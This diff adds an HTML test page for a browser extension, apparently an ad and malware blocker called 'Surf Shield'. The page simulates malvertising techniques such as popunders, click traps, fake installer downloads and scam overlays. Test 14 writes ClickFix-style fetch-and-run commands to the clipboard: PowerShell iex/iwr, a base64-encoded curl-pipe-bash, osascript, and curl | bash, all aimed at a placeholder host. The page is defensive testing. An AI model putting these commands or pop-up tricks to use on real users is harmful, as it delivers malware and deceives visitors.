@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Surf Shield attack simulator</title>
+  <style>
+    body { font-family: -apple-system, sans-serif; max-width: 720px; margin: 30px auto; padding: 0 16px; }
+    h1 { font-size: 20px; }
+    .test { border: 1px solid #ccc; border-radius: 8px; padding: 12px 16px; margin: 10px 0; }
+    .test h3 { margin: 0 0 4px; font-size: 15px; }
+    .test p { margin: 4px 0 10px; font-size: 13px; color: #555; }
+    button { padding: 6px 12px; cursor: pointer; }
+    .result { font-weight: bold; margin-left: 10px; }
+    .pass { color: green; }
+    .fail { color: red; }
+    /* cosmetic-hiding target: EasyList generic selector */
+    .ad--banner { background: #e74c3c; color: #fff; padding: 20px; text-align: center; border-radius: 8px; }
+  </style>
+</head>
+<body>
+  <h1>&#128737; Surf Shield attack simulator</h1>
+  <p>Each button simulates a real malvertising technique. <b>PASS</b> = the attack was blocked.
+     Run from a local server (content scripts often don't run on <code>file://</code>):
+     <code>python3 -m http.server 8080</code> then open <code>http://localhost:8080/tests/test.html</code></p>
+
+  <div class="test">
+    <h3>1. window.open with no user gesture</h3>
+    <p>Fires window.open after the 1s gesture window has expired.</p>
+    <button onclick="setTimeout(() => set('r1', window.open('https://example.com/no-gesture') === null), 1200)">Run (waits 1.2s)</button>
+    <span class="result" id="r1"></span>
+  </div>
+
+  <div class="test">
+    <h3>2. Popunder burst — multiple windows per click</h3>
+    <p>One click tries to open 3 windows. At most the first may open; rest must be blocked.</p>
+    <button onclick="const a=[window.open('https://example.com/1'),window.open('https://example.com/2'),window.open('https://example.com/3')]; set('r2', a.filter(w=>w===null).length >= 2)">Run</button>
+    <span class="result" id="r2"></span>
+  </div>
+
+  <div class="test">
+    <h3>3. Synthetic click on injected _blank anchor</h3>
+    <p>Creates &lt;a target="_blank"&gt; and dispatches a fake MouseEvent (the b7510.com trick).</p>
+    <button onclick="
+      const a = document.createElement('a');
+      a.href = 'https://example.com/synthetic'; a.target = '_blank';
+      document.body.appendChild(a);
+      const ev = new MouseEvent('click', { bubbles: true, cancelable: true });
+      a.dispatchEvent(ev);
+      set('r3', ev.defaultPrevented);
+      a.remove();
+    ">Run</button>
+    <span class="result" id="r3"></span>
+  </div>
+
+  <div class="test">
+    <h3>4. Programmatic anchor .click()</h3>
+    <p>Calls .click() on a _blank anchor without a fresh gesture (runs after 1.2s delay).
+       PASS only if no tab opens.</p>
+    <button onclick="setTimeout(() => {
+      const a = document.createElement('a');
+      a.href = 'https://example.com/proto-click'; a.target = '_blank';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      document.getElementById('r4').textContent = 'ran — PASS if no tab opened';
+    }, 1200)">Run (waits 1.2s)</button>
+    <span class="result" id="r4"></span>
+  </div>
+
+  <div class="test">
+    <h3>5. Fresh-iframe native window.open grab</h3>
+    <p>Creates an about:blank iframe and calls its clean contentWindow.open (anti-adblock bypass).</p>
+    <button onclick="setTimeout(() => {
+      const f = document.createElement('iframe');
+      f.style.display = 'none';
+      document.body.appendChild(f);
+      const w = f.contentWindow.open('https://example.com/iframe-grab');
+      set('r5', w === null);
+      f.remove();
+    }, 1200)">Run (waits 1.2s)</button>
+    <span class="result" id="r5"></span>
+  </div>
+
+  <div class="test">
+    <h3>6. Invisible full-page overlay click trap</h3>
+    <p>Injects a transparent fixed overlay with z-index 99999. PASS = it gets pointer-events:none.</p>
+    <button onclick="
+      const d = document.createElement('div');
+      d.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;opacity:0.01';
+      document.body.appendChild(d);
+      setTimeout(() => {
+        set('r6', getComputedStyle(d).pointerEvents === 'none');
+        d.remove();
+      }, 500);
+    ">Run</button>
+    <span class="result" id="r6"></span>
+  </div>
+
+  <div class="test">
+    <h3>7. Synthetic _blank form submit</h3>
+    <p>Dispatches a fake submit on a _blank form.</p>
+    <button onclick="
+      const f = document.createElement('form');
+      f.action = 'https://example.com/form'; f.target = '_blank'; f.method = 'GET';
+      document.body.appendChild(f);
+      const ev = new SubmitEvent('submit', { bubbles: true, cancelable: true });
+      f.dispatchEvent(ev);
+      set('r7', ev.defaultPrevented);
+      f.remove();
+    ">Run</button>
+    <span class="result" id="r7"></span>
+  </div>
+
+  <div class="test">
+    <h3>8. Push-notification permission scam</h3>
+    <p>Calls Notification.requestPermission(). PASS = instantly "denied" with no browser prompt.</p>
+    <button onclick="Notification.requestPermission().then(p => set('r8', p === 'denied'))">Run</button>
+    <span class="result" id="r8"></span>
+  </div>
+
+  <div class="test">
+    <h3>9. Cosmetic hiding</h3>
+    <p>The red box below has class "ad--banner" (an EasyList generic selector). PASS = you can't see it.</p>
+    <div class="ad--banner">If you can read this, cosmetic hiding is OFF or not matching</div>
+    <button onclick="set('r9', getComputedStyle(document.querySelector('.ad--banner')).display === 'none')">Check</button>
+    <span class="result" id="r9"></span>
+  </div>
+
+  <div class="test">
+    <h3>10. Popunder URL patterns (DNR / navigation backstop)</h3>
+    <p>Open these manually in a new tab — each must show a blocked error or the Surf Shield warning page:</p>
+    <ul style="font-size:13px">
+      <li><a href="https://example.com/afu.php?zoneid=12345" target="_blank" rel="noopener">afu.php?zoneid=</a></li>
+      <li><a href="https://example.com/?a=1&amp;utm_medium=popunder" target="_blank" rel="noopener">utm_medium=popunder</a></li>
+      <li><a href="https://example.com/sklnk/99999" target="_blank" rel="noopener">/sklnk/</a></li>
+    </ul>
+  </div>
+
+  <div class="test">
+    <h3>11. Download protection</h3>
+    <p>Click to download a dummy .exe. PASS = download pauses and a Surf Shield warning tab opens.</p>
+    <button onclick="
+      const blob = new Blob(['test'], { type: 'application/octet-stream' });
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = 'surfshield-test.exe';
+      document.body.appendChild(a); a.click(); a.remove();
+    ">Run</button>
+    <span class="result" id="r11">(manual check)</span>
+  </div>
+
+  <div class="test">
+    <h3>12. Stealer delivery — disguised / fake-installer filename</h3>
+    <p>Downloads "invoice.pdf.exe" then "OperaSetup.exe". PASS = each pauses with a warning tab
+       that lists the extra reason (hidden second extension / mimics a well-known installer).
+       3+ reasons turns the warning into high-risk wording.</p>
+    <button onclick="fakeDownload('invoice.pdf.exe')">invoice.pdf.exe</button>
+    <button onclick="fakeDownload('OperaSetup.exe')">OperaSetup.exe</button>
+    <span class="result" id="r12">(manual check)</span>
+  </div>
+
+  <div class="test">
+    <h3>13. Stealer delivery — ad-campaign download URL</h3>
+    <p>Downloads an .exe from a URL carrying ad-network campaign parameters.
+       PASS = warning tab includes "Download URL carries ad-network campaign parameters"
+       (or the request is blocked outright by a DNR pattern rule).</p>
+    <button onclick="
+      const a = document.createElement('a');
+      a.href = location.pathname + '?ad_campaign_id=12345';
+      a.download = 'player_setup.exe';
+      document.body.appendChild(a); a.click(); a.remove();
+    ">Run</button>
+    <span class="result" id="r13">(manual check)</span>
+  </div>
+
+  <div class="test">
+    <h3>14. ClickFix clipboard hijack (Windows PowerShell + macOS variants)</h3>
+    <p>Each scam button attempts a different real-world infostealer clipboard payload —
+       Windows PowerShell, macOS <code>bash &lt;&lt;&lt; $(echo … | base64 -d)</code> (the exact
+       shape of the July 2026 <code>bypassingprocess.pages.dev</code> payload we caught in the
+       wild), macOS <code>osascript</code>, and Linux/macOS <code>curl | bash</code>.
+       PASS = clipboard does NOT contain the command (paste in the box to verify).
+       Then run the benign copy — it must still work.</p>
+    <button onclick="clipTest('r14', 'powershell -WindowStyle Hidden -Command &quot;iex (iwr https://example.com/x.ps1)&quot;', false)">Windows PowerShell</button>
+    <button onclick="clipTest('r14c', 'bash &lt;&lt;&lt; $(echo &quot;Y3VybCAtcyAnaHR0cHM6Ly9leGFtcGxlLmNvbS94LnNoJyB8IGJhc2g=&quot; | base64 -d)', false)">macOS base64 dropper</button>
+    <button onclick="clipTest('r14d', 'osascript -e &quot;do shell script \\&quot;curl -s https://example.com/x.sh | sh\\&quot;&quot;', false)">macOS osascript</button>
+    <button onclick="clipTest('r14e', 'curl -sSL https://example.com/x.sh | bash', false)">curl | bash</button>
+    <button onclick="clipTest('r14b', 'hello from surf shield test', true)">Benign copy</button>
+    <span class="result" id="r14"></span>
+    <span class="result" id="r14c"></span>
+    <span class="result" id="r14d"></span>
+    <span class="result" id="r14e"></span>
+    <span class="result" id="r14b"></span>
+    <input id="paste-here" placeholder="paste here to verify clipboard" style="width:220px;margin-left:8px" />
+  </div>
+
+  <div class="test">
+    <h3>15. "Click 5 times" download gauntlet</h3>
+    <p>Simulates a shady download site: a page-wide click listener hijacks every genuine
+       click on the fake button below to open a random ad domain (smartlink rotation).
+       Click the button 5 times. PASS = at most 2 ad tabs open; clicks 3–5 are blocked.</p>
+    <button id="gauntlet-btn">FREE DOWNLOAD</button>
+    <span class="result" id="r15"></span>
+  </div>
+
+  <div class="test">
+    <h3>16. Interstitial ad — full-viewport dark modal with cross-site link</h3>
+    <p>Injects the mrnoegyi.com-style interstitial: a fixed dark backdrop covering the whole
+       viewport, containing a cross-site anchor CTA, injected after page load, with body
+       scroll-locked. PASS = the wrapper is set to <code>display: none</code> within ~1 s
+       of injection.</p>
+    <button onclick="
+      const shell = document.createElement('div');
+      shell.setAttribute('data-ss-test', 'interstitial');
+      shell.style.cssText = 'position:fixed;inset:0;z-index:99999;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center';
+      const card = document.createElement('a');
+      card.href = 'https://ad-network.example/lp?cid=xyz';
+      card.target = '_blank';
+      card.style.cssText = 'display:block;padding:40px;background:#fff;color:#111;border-radius:8px;text-decoration:none';
+      card.textContent = 'Special offer — click to learn more';
+      shell.appendChild(card);
+      document.body.appendChild(shell);
+      const prevOverflow = document.body.style.overflow;
+      document.body.style.overflow = 'hidden';
+      setTimeout(() => {
+        const hidden = getComputedStyle(shell).display === 'none';
+        set('r16', hidden);
+        shell.remove();
+        document.body.style.overflow = prevOverflow;
+      }, 1200);
+    ">Run</button>
+    <span class="result" id="r16"></span>
+  </div>
+
+  <div class="test">
+    <h3>17. Floating cross-site ad card — fake chat notification</h3>
+    <p>Injects a small delayed fixed-position card with a cross-site anchor (the "Anna 👀 How are
+       you? Answer / Mark as read" dating-scam pattern from mrnoegyi.com). PASS = the card is
+       set to <code>display: none</code> within ~1 s.</p>
+    <button onclick="
+      const card = document.createElement('div');
+      card.setAttribute('data-ss-test', 'floating-ad');
+      card.style.cssText = 'position:fixed;top:120px;left:50%;transform:translateX(-50%);width:280px;height:160px;z-index:9999;background:#eee;padding:10px;border:1px solid #999';
+      const a = document.createElement('a');
+      a.href = 'https://dating-scam.example/chat?u=anna';
+      a.target = '_blank';
+      a.textContent = 'Anna — How are you? (Answer)';
+      card.appendChild(a);
+      document.body.appendChild(card);
+      setTimeout(() => {
+        const hidden = getComputedStyle(card).display === 'none';
+        set('r17', hidden);
+        card.remove();
+      }, 1200);
+    ">Run</button>
+    <span class="result" id="r17"></span>
+  </div>
+
+  <script>
+    (function () {
+      // Mimics a popunder network: document-level capture listener + rotating
+      // ad destinations, powered by the user's real clicks.
+      const adDomains = ['ad-rotator-one.example', 'ad-rotator-two.example',
+                        'ad-rotator-three.example', 'ad-rotator-four.example',
+                        'ad-rotator-five.example'];
+      let clicks = 0, opened = 0, blocked = 0;
+      document.addEventListener('click', function (e) {
+        if (e.target.id !== 'gauntlet-btn') return;
+        clicks++;
+        const dest = 'https://' + adDomains[clicks % adDomains.length] + '/landing?visit=' + clicks;
+        const w = window.open(dest);
+        if (w === null) blocked++; else opened++;
+        try { window.blur(); } catch {}
+        if (clicks >= 5) set('r15', opened <= 2 && blocked >= 3);
+        else document.getElementById('r15').textContent = clicks + '/5 clicks (' + opened + ' opened, ' + blocked + ' blocked)';
+      }, true);
+    })();
+
+    async function clipTest(id, text, expectCopied) {
+      await navigator.clipboard.writeText(text).catch(() => {});
+      // Firefox pages can't readText — verify by pasting into the box instead.
+      if (!navigator.clipboard.readText) {
+        document.getElementById(id).textContent = '(paste in the box to verify)';
+        return;
+      }
+      const t = await navigator.clipboard.readText().catch(() => '');
+      set(id, expectCopied ? t === text : t !== text);
+    }
+    function fakeDownload(name) {
+      const blob = new Blob(['test'], { type: 'application/octet-stream' });
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = name;
+      document.body.appendChild(a); a.click(); a.remove();
+    }
+    function set(id, pass) {
+      const el = document.getElementById(id);
+      el.textContent = pass ? 'PASS' : 'FAIL';
+      el.className = 'result ' + (pass ? 'pass' : 'fail');
+    }
+  </script>
+</body>
+</html>
